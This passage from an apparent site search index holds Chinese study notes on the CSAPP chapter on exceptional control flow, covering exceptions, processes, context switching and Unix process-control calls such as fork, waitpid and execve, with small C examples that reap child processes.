\u5b9e\u73b0\u8fdb\u7a0b\u7684\u7ec6\u8282\uff0c\u53ea\u5173\u5fc3\u8fdb\u7a0b\u7684\u91cd\u8981\u62bd\u8c61: \u72ec\u7acb\u7684\u903b\u8f91\u63a7\u5236\u6d41: \u2002 \u4eff\u4f5b\u7a0b\u5e8f\u72ec\u5360\u5904\u7406\u5668 \u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4: \u2002 \u4eff\u4f5b\u7a0b\u5e8f\u72ec\u7acb\u5730\u4f7f\u7528\u5185\u5b58\u7cfb\u7edf (1). \u63a7\u5236\u6d41 \ud83e\uddd0 \u6bcf\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b83\u7684\u903b\u8f91\u6d41\u7684\u4e00\u90e8\u5206\uff0c\u7136\u540e\u88ab\u62a2\u5360 (preempted)\uff0c\u8f6e\u5230\u5176\u4ed6\u7a0b\u5e8f\uff0c\u4eff\u4f5b\u5728\u72ec\u5360 cpu \u5e76\u53d1\u6d41 (concurrent): \u2002 \u903b\u8f91\u6d41\u7684\u65f6\u95f4\u533a\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6d41\u91cd\u53e0\uff0c\u4f8b\u5982 Process AB\u3001AC\uff0c\u6b64\u6982\u5ff5\u4e0e\u5904\u7406\u5668\u6838\u6570\u548c\u8ba1\u7b97\u673a\u6570\u65e0\u5173 \u591a\u8fdb\u7a0b\u8f6e\u6d41\u6267\u884c\u7684\u6982\u5ff5\u79f0\u4e3a\u591a\u4efb\u52a1\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u63a7\u5236\u6d41\u7684\u67d0\u4e2a\u65f6\u95f4\u6bb5\u79f0\u4e3a\u65f6\u95f4\u7247 (time slice) \u5e76\u884c\u6d41 (parallel): \u2002 \u4e24\u4e2a\u6d41\u5728\u4e0d\u540c\u7684\u5904\u7406\u5668\u4e0a\u5e76\u53d1\uff0c\u662f\u5e76\u53d1\u6d41\u7684\u771f\u5b50\u96c6 (2). \u7528\u6237\u6a21\u5f0f\u548c\u5185\u6838\u6a21\u5f0f \ud83e\uddd0 OS kernel \u8981\u60f3\u5b9e\u73b0\u65e0\u61c8\u53ef\u51fb\u7684\u8fdb\u7a0b\u62bd\u8c61\uff0ccpu \u5fc5\u987b\u63d0\u4f9b\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u9650\u5236\u7a0b\u5e8f\u8bbf\u95ee\u7684\u5730\u5740\u8303\u56f4 & \u6267\u884c\u7684\u6307\u4ee4\u79cd\u7c7b\u3002cpu \u901a\u5e38\u7528\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u67d0\u4e2a\u6a21\u5f0f\u4f4d\u5b9e\u73b0\u6b64\u529f\u80fd\uff0c\u5f53\u6a21\u5f0f\u4f4d\u4e3a 1\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728 kernel mode \u4e2d: \u2002 \u53ef\u4ee5\u8bbf\u95ee\u5185\u5b58\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002 \u7a0b\u5e8f\u521d\u59cb\u5904\u4e8e user mode:\u2002 \u4e0d\u5141\u8bb8\u6267\u884c privileged instruction\uff0c\u4f8b\u5982\u6539\u53d8\u6a21\u5f0f\u4f4d\u3001\u53d1\u8d77 I/O \u64cd\u4f5c\uff0c\u4e5f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5185\u6838\u533a\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u53ea\u80fd\u7531\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u95f4\u63a5\u8bbf\u95ee\uff0c\u4efb\u4f55\u8d8a\u6743\u64cd\u4f5c\u90fd\u4f1a\u5bfc\u81f4\u6545\u969c \u4ece user mode \u8fdb\u5165 kernel mode \u552f\u4e00\u65b9\u6cd5\u662f\u901a\u8fc7\u5f02\u5e38\uff0c\u5f02\u5e38\u53d1\u751f\u65f6\uff0c\u63a7\u5236\u4f20\u9012\u7ed9 handler\uff0ccpu \u540c\u65f6\u8fdb\u5165 kernel mode\uff1b\u63a7\u5236\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0ccpu \u4e5f\u8fd4\u56de\u5230 user mode (3). \u4e0a\u4e0b\u6587\u5207\u6362 \ud83e\uddd0 \u4e0a\u4e0b\u6587\u5207\u6362 (context switch) \u662f\u4e00\u79cd\u9ad8\u5c42\u7684 ECF\uff0c\u5efa\u7acb\u5728\u5f02\u5e38\u673a\u5236\u4e4b\u4e0a\uff0cOS \u901a\u8fc7\u6b64\u65b9\u5f0f\u5b9e\u73b0\u591a\u4efb\u52a1\u3002\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e0a\u4e0b\u6587: \u901a\u7528\u5bc4\u5b58\u5668\u3001\u6d6e\u70b9\u5bc4\u5b58\u5668\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u3001\u72b6\u6001\u5bc4\u5b58\u5668\u3001\u7528\u6237\u6808\u3001\u5185\u6838\u6808\u7b49 \u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u5982: \u9875\u8868\u3001\u8fdb\u7a0b\u8868\u3001\u6587\u4ef6\u8868 \u5185\u6838\u4e2d\u7684\u8c03\u5ea6\u5668 (scheduler) \u4ee3\u7801\u51b3\u5b9a\u62a2\u5360\u8fdb\u7a0b\u7684\u7b56\u7565\uff0c\u5f53\u524d\u8fdb\u7a0b\u88ab\u62a2\u5360\u540e\uff0c\u5c31\u4f1a\u53d1\u751f\u4e0a\u4e0b\u6587\u5207\u6362: \u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u6062\u590d\u5148\u524d\u67d0\u4e2a\u88ab\u62a2\u5360\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587 \u5c06\u63a7\u5236\u4f20\u9012\u7ed9\u65b0\u6062\u590d\u7684\u8fdb\u7a0b \u4e2d\u65ad\u548c\u7cfb\u7edf\u8c03\u7528\u90fd\u53ef\u4ee5\u5bfc\u81f4\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u4f8b\u5982: example \u8fdb\u7a0b A \u7531\u7cfb\u7edf\u8c03\u7528 read \u9677\u5165\u5230\u5185\u6838 mode\uff0c\u5185\u6838\u7684 handler \u8bf7\u6c42\u78c1\u76d8\u63a7\u5236\u5668\u7684 DMA \u4f20\u8f93 \u78c1\u76d8\u53d6\u6570\u636e\u9700\u8981\u8f83\u957f\u65f6\u95f4\uff0c\u5185\u6838\u5f88\u53ef\u80fd\u6267\u884c\u4ece A \u5230 B \u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0d\u662f\u4ec0\u4e48\u4e5f\u4e0d\u505a: \u5207\u6362\u524d\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b A \u5728 kernel mode \u4e0b\u6267\u884c\u6307\u4ee4 \u5207\u6362\u540e\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b B \u5728 user mode \u4e0b\u6267\u884c\u6307\u4ee4 \u8fdb\u7a0b B \u5728 user mode \u4e0b\u8fd0\u884c\u4e86\u4e00\u4f1a\u540e\uff0c\u76f4\u5230\u78c1\u76d8\u53d1\u51fa\u4e86\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\uff0c\u8868\u793a\u6570\u636e\u5df2\u7ecf\u4ece\u78c1\u76d8\u4f20\u5230\u4e86\u5185\u5b58\uff0c\u6b64\u65f6\u5185\u6838\u53ef\u80fd\u8ba4\u4e3a B \u5df2\u7ecf\u6267\u884c\u4e86\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u5230 A 3. \u8fdb\u7a0b\u63a7\u5236 \ud83e\uddd0 Unix \u63d0\u4f9b\u4e86\u5f88\u591a C \u7684\u64cd\u4f5c\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u3002 (1). \u83b7\u53d6\u8fdb\u7a0b ID \ud83e\uddd0 \u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u552f\u4e00\u7684\u6b63\u6574\u6570 ID\uff0c getpid \u8fd4\u56de\u8c03\u7528\u8fdb\u7a0b\u7684 PID\uff0c getppid \u8fd4\u56de\u8c03\u7528\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\u7684 PID. #include <sys/types.h> #include <unistd.h> pid_t getpid ( void ); pid_t getppid ( void ); pid_t \u5728 Linux \u7684 types.h \u4e2d\u5b9a\u4e49\u4e3a int (2). \u521b\u5efa\u548c\u7ec8\u6b62\u8fdb\u7a0b \ud83e\uddd0 #include <sys/types.h> #include <unistd.h> pid_t fork ( void ); \u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u6709\u4ee5\u4e0b\u7279\u6027: fork() \u5728\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de 0\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID \u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587 \uff0c\u56e0\u6b64\u548c\u7236\u8fdb\u7a0b\u5e76\u53d1\u6267\u884c\u3001\u5730\u5740\u7a7a\u95f4\u72ec\u7acb\u3001\u5171\u4eab\u6587\u4ef6 eg int main () { pid_t pid ; int x = 1 ; pid = fork (); if ( pid == 0 ) { printf ( \"child : x=%d \\n \" , ++ x ); exit ( 0 ); } printf ( \"parent: x=%d \\n \" , -- x ); exit ( 0 ); } #include <stdlib.h> void exit ( int status ); exit \u4ee5 status \u4e3a\u9000\u51fa\u72b6\u6001\u7ec8\u6b62\u8c03\u7528\u8fdb\u7a0b\u3002 (3). \u56de\u6536\u5b50\u8fdb\u7a0b \ud83e\uddd0 \u8fdb\u7a0b\u7ec8\u6b62\u540e\uff0c\u9700\u8981\u663e\u5f0f\u56de\u6536 (reaped) \u4ee5\u91ca\u653e\u7cfb\u7edf\u8d44\u6e90: \u7ec8\u6b62\u4f46\u672a\u88ab\u56de\u9996\u7684\u8fdb\u7a0b\u79f0\u4e3a zombie init \u8fdb\u7a0b\u7684 PID \u4e3a 1\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u7531\u5185\u6838\u521b\u5efa\u4e14\u4e0d\u4f1a\u7ec8\u6b62\uff0c\u662f\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002\u5982\u679c\u4e00\u4e2a\u7236\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5185\u6838\u4f1a\u5b89\u6392 init \u8fdb\u7a0b\u6210\u4e3a\u5b83\u7684\u5b64\u513f\u8fdb\u7a0b\u7684\u517b\u7236 #include <sys/types.h> #include <sys/wait.h> pid_t waitpid ( pid_t pid , int * statusp , int options ); pid_t wait ( int * statusp ); // <==> waitpid(-1, &status, 0); pid_t pid :\u2002 \u5224\u5b9a\u7b49\u5f85\u96c6\u5408\u7684\u6210\u5458 pid > 0 :\u2002 \u7b49\u5f85\u96c6\u5408\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u5b50\u8fdb\u7a0b\uff0cPID \u4e3a pid pid = -1 :\u2002 \u7b49\u5f85\u96c6\u5408\u662f\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u5b50\u8fdb\u7a0b int options :\u2002\u4fee\u6539\u9ed8\u8ba4\u884c\u4e3a 0 :\u2002 \u9ed8\u8ba4\u884c\u4e3a\uff0c\u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u8fd4\u56de\u5b83\u7684 PID\u3002\u5982\u679c\u521a\u8c03\u7528\u65f6\u5c31\u6709\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5c31\u7acb\u5373\u8fd4\u56de\u3002 WNOHANG :\u2002 \u5982\u679c wait set \u4e2d\u4efb\u4f55\u5b50\u8fdb\u7a0b\u90fd\u672a\u7ec8\u6b62\uff0c\u7acb\u5373\u8fd4\u56de 0 WUNTRACED :\u2002 \u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u7ec8\u6b62 / \u505c\u6b62\uff0c\u8fd4\u56de\u5176 PID WCONTINUED :\u2002 \u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u7ec8\u6b62 \u6216 wait set \u4e2d\u4e00\u4e2a\u88ab\u505c\u6b62\u7684\u8fdb\u7a0b\u6536\u5230 SIGCONT \u7ee7\u7eed\u6267\u884c WNOHANG | WUNTRACED :\u2002 \u7acb\u5373\u8fd4\u56de\uff0cwait set \u4e2d\u6ca1\u6709\u8fdb\u7a0b\u505c\u6b62\u6216\u7ec8\u6b62\u5219\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de\u76f8\u5e94\u7684 PID int * statusp :\u2002\u5982\u679c statusp \u975e\u7a7a\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 MACRO(status) \u7684\u503c\u67e5\u770b\u9000\u51fa\u72b6\u6001 WIFEXITED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u7531 exit \u6216 return \u7ec8\u6b62\uff0c\u8fd4\u56de\u771f WEXITSTATUS :\u2002 \u8fd4\u56de\u6b63\u5e38\u7ec8\u6b62\u7684\u9000\u51fa\u503c\uff0c WIFEXITED \u4e3a\u771f\u624d\u6709\u6548 WIFSIGNALED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u7531\u4e00\u4e2a\u672a\u6355\u83b7\u7684\u4fe1\u53f7\u7ec8\u6b62\uff0c\u8fd4\u56de\u771f WTERMSIG :\u2002 \u8fd4\u56de\u5bfc\u81f4\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u7684\u4fe1\u53f7\u7684\u7f16\u53f7\uff0c WIFSIGNALED \u4e3a\u771f\u624d\u6709\u6548 WIFSTOPPED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u5f53\u524d\u662f\u505c\u6b62\u7684\uff0c\u8fd4\u56de\u771f WSTOPSIG :\u2002 \u8fd4\u56de\u5bfc\u81f4\u5b50\u8fdb\u7a0b\u505c\u6b62\u7684\u4fe1\u53f7\u7684\u7f16\u53f7\uff0c WIFSTOPPED \u4e3a\u771f\u624d\u6709\u6548 WIFCONTINUED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u6536\u5230 SIGCONT \u91cd\u65b0\u542f\u52a8\uff0c\u8fd4\u56de\u771f example: \u2002 reap zombie children random.c #include \"order.h\" #define N 12 int main () { int status , i ; pid_t pid ; /* Parent creates N children */ for ( i = 0 ; i < N ; ++ i ) if (( pid = fork ()) == 0 ) exit ( 100 + i ); /* Parent reaps N children in no particular order */ while (( pid = waitpid ( -1 , & status , 0 )) > 0 ) { if ( WIFEXITED ( status )) printf ( \"child %d terminated normally with exit status=%d \\n \" , pid , WEXITSTATUS ( status )); else printf ( \"child %d terminated abnormally \\n \" , pid ); } /* The only normal termination is if there are no more children */ if ( errno != ECHILD ) fprintf ( stderr , \"waitpid error: %s \\n \" , strerror ( errno )); exit ( 0 ); } inorder.c #include \"order.h\" #define N 12 int main () { int status , i ; pid_t pid [ N ], retpid ; /* Parent creates N children */ for ( i = 0 ; i < N ; ++ i ) if (( pid [ i ] = fork ()) == 0 ) exit ( 100 + i ); /* Parent reaps N children in order */ i = 0 ; while (( retpid = waitpid ( pid [ i ++ ], & status , 0 )) > 0 ) { if ( WIFEXITED ( status )) printf ( \"child %d terminated normally with exit status=%d \\n \" , retpid , WEXITSTATUS ( status )); else printf ( \"child %d terminated abnormally \\n \" , retpid ); } /* The only normal termination is if there are no more children */ if ( errno != ECHILD ) fprintf ( stderr , \"waitpid error: %s \\n \" , strerror ( errno )); exit ( 0 ); } order.h #include <errno.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <sys/wait.h> #include <unistd.h> (4). \u8fdb\u7a0b\u4f11\u7720 \ud83e\uddd0 #include <unistd.h> unsigned int sleep ( unsigned int secs ); int pause ( void ); sleep :\u2002 \u8bf7\u6c42\u4f11\u7720\u65f6\u95f4\u5230\u5219\u8fd4\u56de 0\uff0c\u88ab\u4fe1\u53f7\u4e2d\u65ad\u5219\u8fd4\u56de\u5269\u4f59\u79d2\u6570 pause :\u2002 \u4f11\u7720\u8c03\u7528\u8fdb\u7a0b\u76f4\u5230\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7 (5). \u52a0\u8f7d\u5e76\u8fd0\u884c\u7a0b\u5e8f \ud83e\uddd0 #include <unistd.h> int execve ( const char * filename , const char * argv [], const char * envp []); execve \u5728\u5f53\u524d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5982\u679c\u8fd0\u884c\u6210\u529f\u5219\u4e0d\u4f1a\u8fd4\u56de\u3002","title":"1. process"},{"location":"_csapp/_ECF/1/#1","text":"","title":"1. \u5f02\u5e38"},{"location":"_csapp/_ECF/1/#1_1","text":"\u5f02\u5e38\u662f\u4e00\u79cd ECF\uff0cOS \u901a\u8fc7\u5f02\u5e38\u89e3\u51b3\u76f4\u63a5\u6267\u884c\u9762\u4e34\u7684\u4ee5\u4e0b\u95ee\u9898 \u6743\u9650\u63a7\u5236: \u7528\u6237\u7a0b\u5e8f\u4e0d\u80fd\u5b8c\u5168\u63a7\u5236\u7cfb\u7edf\uff0c\u4f46\u4e5f\u9700\u8981\u4e00\u4e9b\u53d7\u9650\u7684\u64cd\u4f5c \u89e3\u51b3: OS \u901a\u8fc7\u5f02\u5e38\u5206\u5272\u5185\u6838\u6001\u548c\u7528\u6237\u6001 \u9677\u5165\u5f02\u5e38\u540e\uff0c\u5185\u6838\u8bbe\u7f6e\u5904\u7406\u5668\u7684\u67d0\u4e2a\u4f4d\uff0c\u8fdb\u5165\u7279\u6743\u6a21\u5f0f \u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6267\u884c\u7279\u6743\u64cd\u4f5c \u8fdb\u7a0b\u5207\u6362: \u4e2d\u95f4\u4e00\u6bb5\u4ee3\u7801\u662f\u7528\u6237\u4ee3\u7801\uff0c\u5728 cpu \u672a\u6267\u884c OS \u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u5207\u6362\u8fdb\u7a0b \u89e3\u51b3: \u9677\u5165\u5f02\u5e38\u540e\uff0c\u5c31\u6267\u884c\u4e86 OS \u7684\u4ee3\u7801 \u88ab\u52a8: \u7528\u6237\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u8fdb\u884c\u5207\u6362\uff0c\u4f46\u65e0\u6cd5\u5e94\u5bf9\u7528\u6237\u7a0b\u5e8f\u6b7b\u5faa\u73af\u7684\u60c5\u51b5 \u4e3b\u52a8: \u65f6\u949f\u4e2d\u65ad\uff0cOS \u5f00\u673a\u542f\u52a8\u65f6\u949f\uff0c\u63a7\u5236\u65f6\u949f\u8bbe\u5907\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u9001\u4e00\u6b21\u4e2d\u65ad","title":"(1). \u76f4\u63a5\u6267\u884c\u7684\u95ee\u9898"},{"location":"_csapp/_ECF/1/#2","text":"\u5f02\u5e38\u53f7\u4e00\u90e8\u5206\u7531 cpu \u8bbe\u8ba1\u8005\u5206\u914d\uff0c\u53e6\u4e00\u90e8\u5206\u7531 OS kernel \u8bbe\u8ba1\u8005\u5206\u914d\uff0c\u4e14\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee \u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u7cfb\u7edf\u5904\u4e8e\u5185\u6838\u6001\uff0cOS \u521d\u59cb\u5316\u5f02\u5e38\u8868\uff0c\u8868\u76ee $k$ \u6307\u5411\u76f8\u5e94\u7684 handler \u7cfb\u7edf\u6267\u884c\u67d0\u7a0b\u5e8f\u65f6\uff0ccpu \u68c0\u6d4b\u5230\u5f02\u5e38\u4e8b\u4ef6\u3001\u786e\u5b9a\u5f02\u5e38\u53f7 $k$ \u5e76\u8c03\u7528 handler","title":"(2). \u5f02\u5e38\u8868"},{"location":"_csapp/_ECF/1/#3","text":"Class Cause Async/Sync Return Behavior Interrupt Signal from I/O device \u5f02\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 Trap Intentional \u540c\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 Fault Potentially recoverable error \u540c\u6b65 \u53ef\u80fd\u8fd4\u56de\u5230\u5f53\u524d\u6307\u4ee4 Abort Nonrecoverable error \u540c\u6b65 \u4e0d\u4f1a\u8fd4\u56de \u4e2d\u65ad\u7531\u5916\u90e8 I/O \u8bbe\u5907\u7684\u4fe1\u53f7\u5bfc\u81f4\uff0c\u4e0e\u6307\u4ee4\u65e0\u5173\uff0c\u56e0\u6b64\u662f\u5f02\u6b65\u7684\u3002\u6267\u884c\u903b\u8f91: I/O \u8bbe\u5907\u5411 cpu \u4e00\u4e2a\u5f15\u811a\u53d1\u4fe1\u53f7\uff0c\u5e76\u5c06\u5f02\u5e38\u53f7\u653e\u5230\u7cfb\u7edf\u603b\u7ebf\u4e0a (\u8be5\u5f02\u5e38\u53f7\u6807\u8bc6\u5f15\u8d77\u4e2d\u65ad\u7684\u8bbe\u5907) \u5f53\u524d\u6307\u4ee4\u6267\u884c\u5b8c\u6210\u540e\uff0ccpu \u6ce8\u610f\u5230\u5f15\u811a\u7535\u538b\u53d8\u9ad8\uff0c\u4ece\u603b\u7ebf\u8bfb\u53d6\u5f02\u5e38\u53f7\u5e76\u8c03\u7528 handler \u63a7\u5236\u8fd4\u56de\u7ed9\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u4eff\u4f5b\u4ec0\u4e48\u4e5f\u6ca1\u53d1\u751f \u9677\u9631\u5373\u7cfb\u7edf\u8c03\u7528\uff0cLinux \u63d0\u4f9b\u51e0\u767e\u79cd\u7cfb\u7edf\u8c03\u7528 (32 ~ 255) C \u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 syscall \u51fd\u6570\u76f4\u63a5\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4f46\u6807\u51c6 C \u5e93\u6709\u5927\u591a\u6570\u7cfb\u7edf\u8c03\u7528\u7684 wrapper x86-64 \u901a\u8fc7 syscall \u6307\u4ee4\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u6240\u6709\u53c2\u6570\u53ea\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\uff0c\u4f20\u9012\u89c4\u5219\u548c\u51fd\u6570\u76f8\u540c \u6545\u969c\u548c\u7ec8\u6b62 \u6545\u969c\u7531\u9519\u8bef\u60c5\u51b5\u5f15\u8d77\uff0c\u5982\u679c handler \u53ef\u4ee5\u4fee\u6b63\uff0c\u63a7\u5236\u8fd4\u56de\u5230\u5f15\u8d77\u6545\u969c\u7684\u6307\u4ee4\uff0c\u5426\u5219\u5c31\u8c03\u7528\u5185\u6838\u7684 abort routine\uff0c\u7ec8\u6b62\u5f15\u8d77\u9519\u8bef\u7684\u5e94\u7528\u7a0b\u5e8f \u7ec8\u6b62\u901a\u5e38\u662f\u81f4\u547d\u7684\u786c\u4ef6\u9519\u8bef\uff0c\u4f8b\u5982 DRAM / SRAM \u4f4d\u635f\u574f\u9020\u6210\u7684\u5947\u5076\u9519\u8bef\uff0chandler \u4e0d\u4f1a\u5c1d\u8bd5\u8fd4\u56de\uff0c\u76f4\u63a5\u5c06\u63a7\u5236\u4ea4\u7ed9 abort routine Linux/x86-64 \u5e38\u89c1\u7684 \u6545\u969c/\u7ec8\u6b62 \u4e3e\u4f8b Exception Number Description Exception Class 0 Divide error Fault 13 General protection fault Fault 14 Page fault Fault 18 Machine check Abort \u9664\u6cd5\u9519\u8bef: \u9664\u4ee5 0 \u6216 \u9664\u6cd5\u6307\u4ee4\u7684\u7ed3\u679c\u5bf9\u4e8e\u76ee\u6807\u64cd\u4f5c\u6570\u592a\u5927\u3002Unix \u4e0d\u4f1a\u5c1d\u8bd5\u6062\u590d \u4e00\u822c\u4fdd\u62a4\u6545\u969c: \u5f15\u7528\u672a\u5b9a\u4e49\u865a\u5b58\u533a\u57df\u6216\u5c1d\u8bd5\u5199\u5165\u53ea\u8bfb\u533a\uff0cLinux \u4e0d\u4f1a\u5c1d\u8bd5\u6062\u590d\uff0c\u4e00\u822c\u62a5\u544a\u4e3a\u6bb5\u9519\u8bef \u673a\u5668\u68c0\u67e5: \u81f4\u547d\u7684\u786c\u4ef6\u9519\u8bef","title":"(3). \u5f02\u5e38\u5206\u7c7b"},{"location":"_csapp/_ECF/1/#2_1","text":"\u8fdb\u7a0b\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u6700\u6df1\u523b\u3001\u6700\u6210\u529f\u7684\u6982\u5ff5\u4e4b\u4e00\u3002\u4e0d\u5173\u6ce8 OS \u5b9e\u73b0\u8fdb\u7a0b\u7684\u7ec6\u8282\uff0c\u53ea\u5173\u5fc3\u8fdb\u7a0b\u7684\u91cd\u8981\u62bd\u8c61: \u72ec\u7acb\u7684\u903b\u8f91\u63a7\u5236\u6d41: \u2002 \u4eff\u4f5b\u7a0b\u5e8f\u72ec\u5360\u5904\u7406\u5668 \u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4: \u2002 \u4eff\u4f5b\u7a0b\u5e8f\u72ec\u7acb\u5730\u4f7f\u7528\u5185\u5b58\u7cfb\u7edf","title":"2. \u8fdb\u7a0b"},{"location":"_csapp/_ECF/1/#1_2","text":"\u6bcf\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b83\u7684\u903b\u8f91\u6d41\u7684\u4e00\u90e8\u5206\uff0c\u7136\u540e\u88ab\u62a2\u5360 (preempted)\uff0c\u8f6e\u5230\u5176\u4ed6\u7a0b\u5e8f\uff0c\u4eff\u4f5b\u5728\u72ec\u5360 cpu \u5e76\u53d1\u6d41 (concurrent): \u2002 \u903b\u8f91\u6d41\u7684\u65f6\u95f4\u533a\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6d41\u91cd\u53e0\uff0c\u4f8b\u5982 Process AB\u3001AC\uff0c\u6b64\u6982\u5ff5\u4e0e\u5904\u7406\u5668\u6838\u6570\u548c\u8ba1\u7b97\u673a\u6570\u65e0\u5173 \u591a\u8fdb\u7a0b\u8f6e\u6d41\u6267\u884c\u7684\u6982\u5ff5\u79f0\u4e3a\u591a\u4efb\u52a1\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u63a7\u5236\u6d41\u7684\u67d0\u4e2a\u65f6\u95f4\u6bb5\u79f0\u4e3a\u65f6\u95f4\u7247 (time slice) \u5e76\u884c\u6d41 (parallel): \u2002 \u4e24\u4e2a\u6d41\u5728\u4e0d\u540c\u7684\u5904\u7406\u5668\u4e0a\u5e76\u53d1\uff0c\u662f\u5e76\u53d1\u6d41\u7684\u771f\u5b50\u96c6","title":"(1). \u63a7\u5236\u6d41"},{"location":"_csapp/_ECF/1/#2_2","text":"OS kernel \u8981\u60f3\u5b9e\u73b0\u65e0\u61c8\u53ef\u51fb\u7684\u8fdb\u7a0b\u62bd\u8c61\uff0ccpu \u5fc5\u987b\u63d0\u4f9b\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u9650\u5236\u7a0b\u5e8f\u8bbf\u95ee\u7684\u5730\u5740\u8303\u56f4 & \u6267\u884c\u7684\u6307\u4ee4\u79cd\u7c7b\u3002cpu \u901a\u5e38\u7528\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u67d0\u4e2a\u6a21\u5f0f\u4f4d\u5b9e\u73b0\u6b64\u529f\u80fd\uff0c\u5f53\u6a21\u5f0f\u4f4d\u4e3a 1\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728 kernel mode \u4e2d: \u2002 \u53ef\u4ee5\u8bbf\u95ee\u5185\u5b58\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002 \u7a0b\u5e8f\u521d\u59cb\u5904\u4e8e user mode:\u2002 \u4e0d\u5141\u8bb8\u6267\u884c privileged instruction\uff0c\u4f8b\u5982\u6539\u53d8\u6a21\u5f0f\u4f4d\u3001\u53d1\u8d77 I/O \u64cd\u4f5c\uff0c\u4e5f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5185\u6838\u533a\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u53ea\u80fd\u7531\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u95f4\u63a5\u8bbf\u95ee\uff0c\u4efb\u4f55\u8d8a\u6743\u64cd\u4f5c\u90fd\u4f1a\u5bfc\u81f4\u6545\u969c \u4ece user mode \u8fdb\u5165 kernel mode 